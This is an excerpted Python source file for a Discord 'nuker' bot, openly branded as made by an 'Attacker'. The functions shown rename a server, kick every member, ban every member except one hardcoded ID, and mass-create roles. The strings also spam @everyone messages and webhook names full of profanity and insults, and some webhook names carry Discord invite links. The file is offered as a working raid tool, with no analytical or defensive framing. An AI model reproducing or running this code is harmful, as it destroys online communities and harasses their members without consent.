...
channel_names = ['ATTACKER']
message_spam = ['@everyone jija aagaya ! GET FUCKED UP']
webhook_names = ['.gg/e-couplez RUNZ CORD', '.gg/e-couplez RUNZ CORD','.gg/X7rpYdxRsb RUNZ CORD ', '.gg/X7rpYdxRsb RUNZ CORD']
...
async def Nuke(ctx, amount=200):
  await ctx.message.delete()
  await ctx.guild.edit(name="Fucked By attacker jija")
...
async def kickall(ctx):
  ...
  for member in ctx.guild.members:
    try:
      await member.kick(reason="Attacker Fucks You")
...
async def rolespam(ctx):
  ...
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"Attacker nuker is here")
...
webhook_names = ['Fucked by Team CYBER', 'I got you bitch','RunZ You ', 'Attacker Here']
...
Nuker Made By Attacker 
 ...
 ═══════════
\x1b[38;5;172mLogged In As {client.user}
\x1b[38;5;172mType >own To Begin Nuking
\x1b[38;5;172mVersion: v1.8
\x1b[38;5;172m═══════════════════════════
''')
...
async def tsontop(ctx, amount=20):
  ...
  for i in range(100):  
    ...
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "Attacker RunZ You")
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
